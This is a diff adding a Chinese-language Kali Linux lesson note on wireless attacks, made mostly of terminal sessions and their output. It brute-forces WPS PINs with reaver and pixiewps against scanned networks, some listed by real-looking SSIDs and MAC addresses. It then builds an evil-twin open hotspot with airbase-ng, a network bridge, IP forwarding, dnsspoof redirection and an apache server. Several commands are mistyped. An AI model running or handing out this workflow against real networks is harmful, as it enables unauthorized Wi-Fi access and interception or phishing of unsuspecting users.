@@ -1,0 +1,322 @@
+课时66 WPS及其他工具
+
+root@kali:~# service network-manager stop
+
+root@kali:~# airmon-ng check kill
+Killing these processes:
+
+  PID Name
+  765 dhclient
+  988 wpa_supplicant
+
+先打上面的两个命令，把网卡映射到虚拟机，记住这个顺序
+
+root@kali:~# ifconfig          //看不到网卡
+
+root@kali:~# ifconfig -a       //必须运作ifconfig -a 才可以看到网卡
+
+root@kali:~# airmon-ng start wlan2
+Found 2 processes that could cause trouble.
+If airodump-ng, aireplay-ng or airtun-ng stops working after
+a short period of time, you may want to kill (some of) them!
+
+  PID Name
+ 1672 avahi-daemon
+ 1673 avahi-daemon
+
+PHY     Interface       Dirver         Chipset
+
+phy0    wlan2           ath9k_htc      Atheros Communications, Inc . AR9271 802.11
+                  (mac80211 monitor mode vif enbale for [phy0]wlan2 on [phy0]wlan2mon)
+                  (mac80211 station mode vif disbale for [phy0]wlan2)
+
+root@kali:~# iwconfig
+eth0      no wireless extensions.
+
+wlan2mon  IEE 802.11bgn  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
+          Retry short limit:7  RTS thr:off  Fragment thr:off
+          Power Management:off
+
+lo        no wireless extensions.
+
+root@kali:~# wash
+
+Wash v1.5.2 WiFi Protected Setup Scan Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+Required Arguments:
+	-i, --interface=<iface>              Interface to capture packets on
+	-f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files
+
+Optional Arguments:
+	-c, --channel=<num>                  Channel to listen on [auto]
+	-o, --out-file=<file>                Write data to file
+	-n, --probes=<num>                   Maximum number of probes to send to each AP in scan mode [15]
+	-D, --daemonize                      Daemonize wash
+	-C, --ignore-fcs                     Ignore frame checksum errors
+	-5, --5ghz                           Use 5GHz 802.11 channels
+	-s, --scan                           Use scan mode
+	-u, --survey                         Use survey mode [default]
+	-P, --output-piped              Allows Wash output to be piped. Example. wash x|y|z...
+	-g, --get-chipset                    Pipes output and runs reaver alongside to get chipset
+	-h, --help                           Show help
+
+Example:
+	wash -i mon0
+
+root@kali:~# wash -i wlan2mon
+
+Wash v1.5.2 WiFi Protected Setup Scan Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+BSSID                  Channel       RSSI       WPS Version        WPS Locked       ESSID
+------------------------------------------------------------------------------------------------
+D0:C7:C0:99:ED:3A       1            00        1.0                No               ziroom222
+0C:82:68:5E:76:20       1            00        1.0                No               letv
+14:75:90:21:4F:56       6            00        1.0                No               TP-LINK_4F56
+5C:63:BF:F9:74:0C       6            00        1.0                No               TP-DO3234
+
+root@kali:~# reaver -i wlan2mon -b D0:C7:C0:99:ED:3A -vv -K 1
+
+root@kali:~# reaver -i wlan2mon -b D0:C7:C0:99:ED:3A -vv     //开始11000pin码尝试
+
+root@kali:~# pixiewps
+
+ Pixiewps 1.1 WPS pixie dust attack tool
+ Copyright (c) 2015, wiire <wi7ire@gmail.com>
+
+ Usage: pixiewps <arguments>
+
+ Required Arguments:
+
+    -e, --pke           : Enrollee public key
+    -r, --pkr           : Registrar public key
+    -s, --e-hash1       : Enrollee Hash1
+    -z, --e-hash2       : Enrollee Hash2
+    -a, --authkey       : Authentication session key
+
+ Optional Arguments:
+
+    -n, --e-nonce       : Enrollee nonce (mode 2,3,4)
+    -m, --r-nonce       : Registrar nonce
+    -b, --e-bssid       : Enrollee BSSID
+    -S, --dh-small      : Small Diffie-Hellman keys (PKr not needed)   [No]
+    -f, --force         : Bruteforce the whole keyspace (mode 4)       [No]
+    -v, --verbosity     : Verbosity level 1-3, 1 is quietest            [2]
+
+    -h, --help          : Display this usage screen
+
+ Examples:
+
+ pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>
+ pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce> -S
+ pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -n <e-nonce> -m <r-nonce> -b <e-bssid> -S
+
+ [!] Not all required arguments have been supplied!
+
+root@kali:~# ixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>
+
+root@kali:~# reaver -i wlan2mon -b 00:90:4C:C1:AC:21 -vv -K 1
+
+Reaver v1.5.2 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+[+] Waiting for beacn from 00:90:4C:C1:AC:21
+[+] Switching wlan0mon to channel 1
+[+] Switching wlan0mon to channel 2
+^C
+[+] Nothing done, nothing to save.
+
+root@kali:~# reaver -i wlan2mon -b 00:90:4C:C1:AC:21 -vv -p 52737488 -c 1
+
+Reaver v1.5.2 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212
+
+[+] Switching wlan0mon to channel 1
+[+] Switching wlan0mon to channel 2
+^C
+[+] Nothing done, nothing to save.
+
+╋━━━━━━━━━━━━╋
+┃EVIL TWIN AP / ROGUE AP ┃
+┃       其他工具         ┃
+╋━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━╋
+┃WPS (WIRELESS PROTECTED SETUP)      ┃
+┃蹭网与被蹭网                        ┃
+┃北上广20%的公共场所无线网络是伪造的 ┃
+╋━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WPS (WIRELESS PROTECTED SETUP)                        ┃
+┃airbase-ng -a <AP mac> --essid "kifi" -c 11 wlan2mon  ┃
+┃apt-get install bridge-Utils                          ┃安装网桥
+┃brctl addbr bridge                                    ┃
+┃brctl addif Wifi-Bridge eth0                          ┃
+┃brctl addif Wifi-Bridge at0                           ┃
+┃ifconfig eth0 0.0.0.0 up                              ┃
+┃ifconfig at0 0.0.0.0 up                               ┃
+┃ifconfig bridge 192.168.1.10 up                       ┃
+┃route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1 ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# airodump-ng wlan2mon
+CH  1][ Elapsed: 3 mins ][ 2015-11-18 21:11
+
+BSSID              PWR  Beacons    #Data, #/s   CH  MB  ENC   CIPHER AUTH ESSID
+
+14:75:90:21:4F:56  -47      114        5    0    6  54e. WPA2 CCMP   PSK  TP-LINK_4F56
+EC:26:CA:DC:29:B6  -32      190        0    0   11  54e. WPA2 TKIP   MGT  kifi
+08:10:79:2A:29:7A  -65      137        0    0    6  54e. WPA2 CCMP   PSK  2-1-403
+D0:C7:C0:99:ED:3A  -69       94        8    0    1  54e  WPA2 CCMP   PSK  ziroom222
+E0:06:E6:39:C3:0C  -76       90        0    0    6  54e. WPA2 CCMP   PSK  lizhi2012
+5C:63:BF:F9:74:0C  -79       99        0    0    6  54e. WPA2 CCMP   PSK  TP-D03234
+BC:D1:77:C0:87:DE  -86       56        0    0   11  54e  WPA2 CCMP   PSK  MERCURY_C087DE
+50:BD:5F:C0:F6:D6  -85       46        0    0   11  54e. WPA2 CCMP   PSK  MasterHuang
+BC:14:EF:A1:97:29  -84       46        0    0    1  54e  WPA2 CCMP   PSK  gehua01141406060486797
+00:1E:58:OA:26:B2  -88       39        0    0    6  54e. WPA2 CCMP   PSK  dlink
+EC:26:CA:3D:9C:ED  -90       12        0    0    1  54e. WPA2 CCMP   PSK  YW170
+80:89:17:15:86:28  -90        9        0    0   11  54e. WPA2 CCMP   PSK  TP-D03235
+C8:3A:35:2A:D6:A8  -91        7        0    0    6  54e  WPA2 CCMP   PSK  nayunhao
+
+BSSID              STATION            PWR    Rate    Lost     Frames  Probe
+
+14:75:90:21:4F:56  E8:3E:B6:1B:19:32  -64     0 -l1e    0          1
+14:75:90:21:4F:56  90:3C:92:BA:00:CC  -77     0G-11     0          7
+14:75:90:21:4F:56  18:DC:56:F0:26:9F  -84     0 -1      0          1
+
+
+root@kali:~# airbase-ng -c 11 --essid kifi-free wlan2mon    //伪造wifi-free无线网络
+21:12:36  Created tap interface at0
+12:12:36  Trying to set MTU on at0 to 1500
+12:12:36  Trying to set MTU on wlan2mon to 1800
+21:12:37  Acess Point with BSSID 08:57:00:0C:96 started
+
+root@kali:~# ifconfig -a    //出现了at0伪造网卡
+
+root@kali:~# airodump-ng wlan2mon      //再侦听一下，出现了wifi-free无线网络
+CH  1][ Elapsed: 3 mins ][ 2015-11-18 21:11
+
+BSSID              PWR  Beacons    #Data, #/s   CH  MB  ENC   CIPHER AUTH ESSID
+
+00:1E:58:OA:26:B2  -88       39        0    0    6  54e. WPA2 CCMP   PSK  dlink
+C8:3A:35:2A:D6:A8  -91        7        0    0    6  54e  WPA2 CCMP   PSK  nayunhao
+EC:26:CA:DC:29:B6  -32      190        0    0   11  54e  OPN
+EC:26:CA:DC:29:B6  -32      190        0    0   11  54e. WPA2 TKIP   MGT  kifi
+14:75:90:21:4F:56  -47      114        5    0    6  54e. WPA2 CCMP   PSK  TP-LINK_4F56
+08:10:79:2A:29:7A  -65      137        0    0    6  54e. WPA2 CCMP   PSK  2-1-403
+D0:C7:C0:99:ED:3A  -69       94        8    0    1  54e  WPA2 CCMP   PSK  ziroom222
+5C:63:BF:F9:74:0C  -79       99        0    0    6  54e. WPA2 CCMP   PSK  TP-D03234
+E0:06:E6:39:C3:0C  -76       90        0    0    6  54e. WPA2 CCMP   PSK  lizhi2012
+BC:14:EF:A1:97:29  -84       46        0    0    1  54e  WPA2 CCMP   PSK  gehua01141406060486797
+BC:D1:77:C0:87:DE  -86       56        0    0   11  54e  WPA2 CCMP   PSK  MERCURY_C087DE
+50:BD:5F:C0:F6:D6  -85       46        0    0   11  54e. WPA2 CCMP   PSK  MasterHuang
+EC:26:CA:3D:9C:ED  -90       12        0    0    1  54e. WPA2 CCMP   PSK  YW170
+
+BSSID              STATION            PWR    Rate    Lost     Frames  Probe
+
+(not associated)  64:09:80:24:A2:C9   -93     0 -  1    0          3  leon
+
+root@kali:~# apt-get install bridge-Utils     //安装网桥
+
+root@kali:~# brctl
+Usage: brctl [commands]
+commands:
+	addbr     	<bridge>		add bridge
+	delbr     	<bridge>		delete bridge
+	addif     	<bridge> <device>	add interface to bridge
+	delif     	<bridge> <device>	delete interface from bridge
+	hairpin   	<bridge> <port> {on|off}	turn hairpin on/off
+	setageing 	<bridge> <time>		set ageing time
+	setbridgeprio	<bridge> <prio>		set bridge priority
+	setfd     	<bridge> <time>		set bridge forward delay
+	sethello  	<bridge> <time>		set hello time
+	setmaxage 	<bridge> <time>		set max message age
+	setpathcost	<bridge> <port> <cost>	set path cost
+	setportprio	<bridge> <port> <prio>	set port priority
+	show      	[ <bridge> ]		show a list of bridges
+	showmacs  	<bridge>		show a list of mac addrs
+	showstp   	<bridge>		show bridge stp info
+	stp       	<bridge> {on|off}	turn stp on/off
+
+root@kali:~# brctl addbr bridge
+
+root@kali:~# brctl addif bridge eth0
+
+root@kali:~# dhclient eth0
+Job for smbd.service failed. See 'systemctl status smbd.service' and 'journalctl -xn' for details.
+invoke-rc.d: initscript smbd, action "reload" failed.
+
+root@kali:~# brctl addif bridge eth0
+
+root@kali:~# brctl adddif bidge at0
+
+root@kali:~# ifconfig eth0 0.0.0.0 up
+
+root@kali:~# ifconfig at0 0.0.0.0 up
+
+root@kali:~# netstat -ar
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         10.1.1.1        0.0.0.0         UG        0 0          0 bridge
+
+root@kali:~# route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.1.1.1
+
+root@kali:~# netstat -ar
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         10.1.1.1        0.0.0.0         UG        0 0          0 bridge
+10.0.0.0         10.1.1.1       255.0.0.0       U         0 0          0 bridge
+
+╋━━━━━━━━━━━━━━━━━━━╋
+┃WPS (WIRELESS PROTECTED SETUP)        ┃
+┃echo 1 > /proc/sys/net/ipv4/ip_forward┃
+┃dnspoof -i bridge -f dnsspoof.hosts   ┃
+┃    /usr/share/dnsiff/dnsspoof.hosts  ┃
+┃apachet2ctl start                     ┃
+╋━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# vi /proc/sys/net/ipv4/ip_forward
+不让修改数据！
+
+root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
+把0改成1，就开启了路由功能！
+
+root@kali:~# cat /proc/sys/net/ipv4/ip_forward
+1
+
+root@kali:~# dnspoof -i bridge -f dnsspoof.hosts
+
+root@kali:~# cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+root@kali:~# cat /usr/share/dnsiff/dnsspoof.hosts
+
+root@kali:~# vi host
+
+root@kali:~# dnsspoof -i bridge -f host
+dnsspoof: listening on bridge [udp dst port 53 and not src 10.1.1.101]
+
+root@kali:~# apache
+apache2        apache2ctl        apachectl        apache-users
+
+root@kali:~# apachet2ctl start
+AH00558: apache2: Coule not reliably determine the Server's fully qualified domain name, using 127.0.1.l.Set the 'ServerName' directive globally to suppress this message
+
+root@kali:~# netstat -pantu | grep :80
+tcp6       0      0 :::80                    :::*                 LISTEN         2941/apache2
+
+
+
+
